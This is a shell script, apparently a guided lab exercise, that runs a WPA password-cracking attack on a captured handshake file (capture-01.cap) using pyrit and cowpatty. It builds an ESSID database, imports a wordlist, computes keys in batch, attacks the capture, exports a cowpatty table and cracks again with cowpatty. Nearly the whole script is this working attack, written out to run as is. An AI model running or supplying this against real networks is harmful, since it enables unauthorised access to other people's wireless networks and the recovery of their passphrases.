rm hackme.cow

echo "<<--- Create an ESSID and add to the pyrit database --->>"
echo "========================================"
echo "	   pyrit -e hackme create_essid"
echo "========================================"
pyrit -e hackme create_essid
echo -n "<<--- end of 1st phase --->>"
read

echo
echo "<<--- Import password i.e. upload the wordlist to the pyrit database --->>"
echo "========================================"
echo "pyrit -i password.lst import_passwords"
echo "========================================"
pyrit -i password.lst import_passwords
echo -n "<<--- end of 2nd phase --->>"
read

echo
echo "<<--- Start batch process --->>"
echo "========================================"
echo "		pyrit batch"
echo "========================================"
pyrit batch
echo -n "<<--- end of 3rd phase --->>"
read

echo
echo "<<---            4-1           --->>"
echo "<<--- Using pyrit to crack key --->>"
echo "=============================================="
echo "pyrit -e hackme -r capture-01.cap attack_batch"
echo "=============================================="
pyrit -e hackme -r capture-01.cap attack_batch
echo -n "<<--- end of crack --->>"
read

echo
echo "<<---             4-2               --->>"
echo "<<--- Export rainbow table to use with cowpatty --->>"
echo "============================================="
echo "pyrit -e hackme -o hackme.cow export_cowpatty"
echo "============================================="
pyrit -e hackme -o hackme.cow export_cowpatty
echo -n "<<--- end of exporting --->>"
read

echo
echo "<<--- Send rainbow table to cracker --->>"
echo "=================================================="
echo "cowpatty -d hackme.cow -r capture-01.cap -s hackme"
echo "=================================================="
cowpatty -d hackme.cow -r capture-01.cap -s hackme
